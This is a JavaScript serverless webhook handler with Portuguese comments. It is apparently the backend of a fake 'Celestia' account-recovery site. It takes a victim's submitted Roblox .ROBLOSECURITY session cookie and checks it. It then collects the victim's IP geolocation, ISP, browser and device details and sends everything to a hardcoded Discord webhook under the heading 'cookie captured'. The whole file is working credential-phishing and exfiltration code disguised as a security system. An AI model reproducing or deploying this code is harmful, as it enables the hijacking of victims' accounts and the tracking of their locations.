// /api/webhook.js
export default async function handler(req, res) {
  // Configurações de segurança
  const ALLOWED_ORIGINS = [
    'http://localhost:3000',
    'https://celestia-recovery.vercel.app',
    'https://celestia.vercel.app'
  ];

  const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
  const CHECK_BAN_URL = process.env.CHECK_BAN_URL || 'https://sua-api-ban.com/verificar';
  
  // Rate limiting simples (em produção use Redis)
  const rateLimit = new Map();
  const RATE_LIMIT_WINDOW = 5 * 60 * 1000; // 5 minutos
  const MAX_REQUESTS_PER_IP = 3;

  // Permitir CORS apenas para origens confiáveis
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin) || process.env.NODE_ENV === 'development') {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  } else {
    res.setHeader('Access-Control-Allow-Origin', '');
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');
  res.setHeader('Access-Control-Max-Age', '86400'); // 24 horas

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      error: 'Method not allowed',
      message: 'Use POST para enviar dados' 
    });
  }

  try {
    const { cookie, ip, device, timestamp, action } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ip;

    // Rate limiting por IP
    const now = Date.now();
    const ipRequests = rateLimit.get(clientIp) || [];
    const recentRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    if (recentRequests.length >= MAX_REQUESTS_PER_IP) {
      return res.status(429).json({ 
        error: 'Rate limit exceeded',
        message: 'Muitas requisições. Aguarde alguns minutos.' 
      });
    }
    
    recentRequests.push(now);
    rateLimit.set(clientIp, recentRequests);

    // Validar dados obrigatórios
    if (!cookie) {
      return res.status(400).json({ 
        error: 'Cookie não fornecido',
        message: 'O cookie é obrigatório' 
      });
    }

    if (cookie.length < 50) {
      return res.status(400).json({ 
        error: 'Cookie inválido',
        message: 'Cookie muito curto ou incompleto' 
      });
    }

    // Validar formato do cookie (.ROBLOSECURITY)
    if (!cookie.includes('.ROBLOSECURITY') && !cookie.match(/^[_|A-Z0-9]+$/i)) {
      return res.status(400).json({ 
        error: 'Formato inválido',
        message: 'Cookie não parece ser do Roblox' 
      });
    }

    // Sanitizar cookie (remover caracteres perigosos)
    const sanitizedCookie = cookie.replace(/[^a-zA-Z0-9_|\-.:]/g, '');

    // Verificar se IP está banido (opcional)
    try {
      const banCheck = await fetch(`${CHECK_BAN_URL}?ip=${clientIp}`);
      const banData = await banCheck.json();
      
      if (banData.banned) {
        return res.status(403).json({ 
          error: 'IP banned',
          message: banData.message || 'IP bloqueado por segurança',
          banned: true 
        });
      }
    } catch (e) {
      console.log('Ban check service unavailable');
    }

    // Buscar informações detalhadas do IP (múltiplas fontes)
    let ipInfo = {};
    let geoInfo = {};
    let securityInfo = {};

    try {
      // IP-API.com (rápido, gratuito)
      const ipResponse = await fetch(`http://ip-api.com/json/${clientIp}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    try {
      // IPAPI.co (mais detalhado)
      const geoResponse = await fetch(`https://ipapi.co/${clientIp}/json/`);
      geoInfo = await geoResponse.json();
    } catch (e) {
      console.error('Erro ao buscar geo info:', e);
    }

    try {
      // Verificar VPN/Proxy (exemplo com IPQualityScore)
      // const vpnResponse = await fetch(`https://ipqualityscore.com/api/json/ip/${process.env.IPQS_KEY}/${clientIp}`);
      // securityInfo = await vpnResponse.json();
    } catch (e) {}

    // Extrair informações do User-Agent
    const ua = req.headers['user-agent'] || '';
    const browserInfo = getBrowserInfo(ua);
    const osInfo = getOSInfo(ua);
    const deviceInfo = getDeviceInfo(ua);
    
    // Capturar headers importantes
    const headers = {
      'accept-language': req.headers['accept-language'] || 'Desconhecido',
      'accept-encoding': req.headers['accept-encoding'] || 'Desconhecido',
      'connection': req.headers['connection'] || 'Desconhecido',
      'referer': req.headers['referer'] || 'Desconhecido',
      'origin': req.headers['origin'] || 'Desconhecido',
      'sec-ch-ua': req.headers['sec-ch-ua'] || 'Desconhecido',
      'sec-ch-ua-mobile': req.headers['sec-ch-ua-mobile'] || 'Desconhecido',
      'sec-ch-ua-platform': req.headers['sec-ch-ua-platform'] || 'Desconhecido',
      'dnt': req.headers['dnt'] || 'Desconhecido',
      'cache-control': req.headers['cache-control'] || 'Desconhecido'
    };

    // Gerar IDs únicos
    const sessionId = generateSessionId();
    const requestId = generateRequestId();

    // Timestamps
    const timestamp_now = Math.floor(Date.now() / 1000);
    const data_br = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

    // Verificar periculosidade
    const riskLevel = calculateRiskLevel(ipInfo, securityInfo, headers);

    // Criar embed para Discord com layout melhorado
    const embed = {
      content: riskLevel.high ? '@everyone ⚠️ **ALERTA DE RISCO** ⚠️' : null,
      embeds: [{
        title: riskLevel.high ? '🚨 **COOKIE CAPTURADO - ALTO RISCO**' : '🔐 **NOVA CAPTURA DE COOKIE**',
        description: `**Cookie validado** • ${action || 'cookie_submit'}`,
        color: riskLevel.high ? 0xef4444 : 0x8b5cf6,
        fields: [
          {
            name: '🍪 **COOKIE COMPLETO**',
            value: '```' + (sanitizedCookie.length > 1000 ? sanitizedCookie.substring(0, 1000) + '...' : sanitizedCookie) + '```'
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${deviceInfo}
Navegador: ${browserInfo.nome} ${browserInfo.versao}
Sistema: ${osInfo.nome} ${osInfo.versao}
Engine: ${browserInfo.engine}
Modo: ${headers['sec-ch-ua-mobile'] === '?0' ? 'Desktop' : 'Mobile'}
Plataforma: ${headers['sec-ch-ua-platform']}
Idiomas: ${headers['accept-language'].substring(0, 50)}
\`\`\``
          },
          {
            name: '🌍 **LOCALIZAÇÃO**',
            value: `\`\`\`yml
IP: ${clientIp}
País: ${ipInfo.country || 'Desconhecido'} (${ipInfo.countryCode || ''})
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Coordenadas: ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
Fuso: ${ipInfo.timezone || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🔧 **REDE**',
            value: `\`\`\`yml
ISP: ${ipInfo.isp || 'Desconhecido'}
Org: ${ipInfo.org || 'Desconhecido'}
ASN: ${ipInfo.as || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? '✅ Sim' : '❌ Não'}
Proxy/VPN: ${ipInfo.proxy ? '✅ Sim' : '❌ Não'}
Hosting: ${ipInfo.hosting ? '✅ Sim' : '❌ Não'}
\`\`\``
          },
          {
            name: '📋 **HEADERS**',
            value: `\`\`\`yml
Referer: ${headers.referer}
Origin: ${headers.origin}
DNT: ${headers.dnt}
Cache: ${headers['cache-control']}
Sec-CH-UA: ${headers['sec-ch-ua']}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMPS**',
            value: `<t:${timestamp_now}:F>\n\`${data_br}\``,
            inline: true
          },
          {
            name: '🆔 **IDENTIFICADORES**',
            value: `\`\`\`yml
Sessão: ${sessionId}
Request: ${requestId}
Tamanho: ${sanitizedCookie.length} chars
\`\`\``,
            inline: true
          },
          {
            name: '⚠️ **ANÁLISE DE RISCO**',
            value: `\`\`\`yml
Nível: ${riskLevel.level}
Proxy/VPN: ${riskLevel.proxy ? 'Sim' : 'Não'}
Data Center: ${riskLevel.datacenter ? 'Sim' : 'Não'}
Tor: ${riskLevel.tor ? 'Sim' : 'Não'}
Score: ${riskLevel.score}/100
\`\`\``,
            inline: true
          }
        ],
        footer: {
          text: 'Celestia Security System • Proteção Avançada • v3.0',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif'
        }
      }]
    };

    // Adicionar campo extra se for alta periculosidade
    if (riskLevel.high) {
      embed.embeds[0].fields.push({
        name: '🚨 **ALERTA DE SEGURANÇA**',
        value: 'Este acesso apresenta características de alto risco. Recomenda-se atenção redobrada.',
        inline: false
      });
    }

    // Enviar para o Discord
    const discordResponse = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!discordResponse.ok) {
      const errorText = await discordResponse.text();
      console.error('Erro Discord:', errorText);
      throw new Error(`Falha ao enviar para Discord: ${discordResponse.status}`);
    }

    // Log para monitoramento
    console.log(`[${data_br}] Cookie recebido de ${clientIp} - ${deviceInfo}`);

    return res.status(200).json({ 
      success: true,
      message: 'Cookie recebido com sucesso',
      requestId: requestId,
      timestamp: timestamp_now
    });
    
  } catch (error) {
    console.error('Erro no webhook:', error);
    
    return res.status(500).json({ 
      error: 'Erro interno',
      message: 'Falha ao processar requisição',
      code: error.code || 'UNKNOWN'
    });
  }
}

// ===== FUNÇÕES AUXILIARES =====

// Detalhamento do navegador
function getBrowserInfo(ua) {
  const info = {
    nome: 'Desconhecido',
    versao: 'Desconhecido',
    engine: 'Desconhecido'
  };

  // Chrome
  if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
    info.nome = 'Google Chrome';
    const match = ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+|\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'Blink';
  }
  // Firefox
  else if (ua.includes('Firefox') && !ua.includes('Seamonkey')) {
    info.nome = 'Mozilla Firefox';
    const match = ua.match(/Firefox\/(\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'Gecko';
  }
  // Safari
  else if (ua.includes('Safari') && !ua.includes('Chrome') && !ua.includes('CriOS')) {
    info.nome = 'Apple Safari';
    const match = ua.match(/Version\/(\d+\.\d+\.?\d*)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'WebKit';
  }
  // Edge
  else if (ua.includes('Edg')) {
    info.nome = 'Microsoft Edge';
    const match = ua.match(/Edg\/(\d+\.\d+\.\d+\.\d+|\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'Blink';
  }
  // Opera
  else if (ua.includes('OPR') || ua.includes('Opera')) {
    info.nome = 'Opera';
    const match = ua.match(/(OPR|Opera)\/(\d+\.\d+)/);
    info.versao = match ? match[2] : 'Desconhecido';
    info.engine = 'Blink';
  }
  // Internet Explorer
  else if (ua.includes('MSIE') || ua.includes('Trident')) {
    info.nome = 'Internet Explorer';
    const match = ua.match(/(MSIE |rv:)(\d+\.\d+)/);
    info.versao = match ? match[2] : 'Desconhecido';
    info.engine = 'Trident';
  }

  return info;
}

// Detalhamento do SO
function getOSInfo(ua) {
  const info = {
    nome: 'Desconhecido',
    versao: 'Desconhecido'
  };

  // Windows
  if (ua.includes('Windows NT 10.0')) {
    info.nome = 'Windows';
    info.versao = ua.includes('ARM') ? '10 ARM' : '10/11';
  } else if (ua.includes('Windows NT 6.3')) {
    info.nome = 'Windows';
    info.versao = '8.1';
  } else if (ua.includes('Windows NT 6.2')) {
    info.nome = 'Windows';
    info.versao = '8';
  } else if (ua.includes('Windows NT 6.1')) {
    info.nome = 'Windows';
    info.versao = '7';
  } else if (ua.includes('Windows NT 6.0')) {
    info.nome = 'Windows';
    info.versao = 'Vista';
  } else if (ua.includes('Windows NT 5.1')) {
    info.nome = 'Windows';
    info.versao = 'XP';
  }
  // macOS
  else if (ua.includes('Mac OS X')) {
    info.nome = 'macOS';
    const match = ua.match(/Mac OS X (\d+[._]\d+[._]\d+|\d+[._]\d+)/);
    info.versao = match ? match[1].replace(/_/g, '.') : 'Desconhecido';
  }
  // Linux/Unix
  else if (ua.includes('Linux')) {
    if (ua.includes('Android')) {
      info.nome = 'Android';
      const match = ua.match(/Android (\d+\.\d+\.?\d*)/);
      info.versao = match ? match[1] : 'Desconhecido';
    } else if (ua.includes('CrOS')) {
      info.nome = 'Chrome OS';
      const match = ua.match(/CrOS\s+[\w\d.]+\s+(\d+\.\d+)/);
      info.versao = match ? match[1] : 'Desconhecido';
    } else {
      info.nome = 'Linux';
      if (ua.includes('Ubuntu')) info.nome = 'Ubuntu';
      else if (ua.includes('Debian')) info.nome = 'Debian';
      else if (ua.includes('Fedora')) info.nome = 'Fedora';
      else if (ua.includes('CentOS')) info.nome = 'CentOS';
    }
  }
  // iOS
  else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
    info.nome = 'iOS';
    const match = ua.match(/OS (\d+[._]\d+[._]?\d*)/);
    info.versao = match ? match[1].replace(/_/g, '.') : 'Desconhecido';
  }

  return info;
}

// Tipo de dispositivo
function getDeviceInfo(ua) {
  if (ua.includes('iPhone')) return '📱 iPhone';
  if (ua.includes('iPad')) return '📱 iPad';
  if (ua.includes('iPod')) return '📱 iPod';
  if (ua.includes('Android') && ua.includes('Mobile')) return '📱 Android Phone';
  if (ua.includes('Android') && !ua.includes('Mobile')) return '📱 Android Tablet';
  if (ua.includes('Windows Phone')) return '📱 Windows Phone';
  if (ua.includes('BlackBerry')) return '📱 BlackBerry';
  if (ua.includes('Tablet') || ua.includes('Tab')) return '📱 Tablet';
  if (ua.includes('TV') || ua.includes('SmartTV')) return '📺 Smart TV';
  if (ua.includes('Watch') || ua.includes('Wearable')) return '⌚ Wearable';
  if (ua.includes('Bot') || ua.includes('Crawler')) return '🤖 Bot/Crawler';
  return '💻 Computador';
}

// Calcular nível de risco
function calculateRiskLevel(ipInfo, securityInfo, headers) {
  let score = 0;
  let reasons = [];

  // Proxy/VPN detectado
  if (ipInfo.proxy) {
    score += 30;
    reasons.push('Proxy/VPN detectado');
  }

  // Data center/hosting
  if (ipInfo.hosting) {
    score += 20;
    reasons.push('IP de data center');
  }

  // Mobile (menos suspeito)
  if (ipInfo.mobile) {
    score -= 10;
  }

  // Headers suspeitos
  if (!headers['accept-language'] || headers['accept-language'] === 'Desconhecido') {
    score += 15;
    reasons.push('Accept-Language ausente');
  }

  if (headers['dnt'] === '1') {
    score -= 5; // Do Not Track é menos suspeito
  }

  if (!headers['referer'] || headers['referer'] === 'Desconhecido') {
    score += 10;
    reasons.push('Referer ausente');
  }

  // Normalizar score (0-100)
  score = Math.min(100, Math.max(0, score));

  return {
    score: score,
    level: score < 30 ? 'BAIXO' : score < 60 ? 'MÉDIO' : 'ALTO',
    high: score >= 60,
    proxy: ipInfo.proxy || false,
    datacenter: ipInfo.hosting || false,
    tor: false, // se tiver API de detecção Tor
    reasons: reasons
  };
}

// Gerar ID de sessão
function generateSessionId() {
  return 'sess_' + Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15) +
         Date.now().toString(36);
}

// Gerar ID de requisição
function generateRequestId() {
  return 'req_' + Date.now().toString(36) + 
         Math.random().toString(36).substring(2, 8).toUpperCase();
}
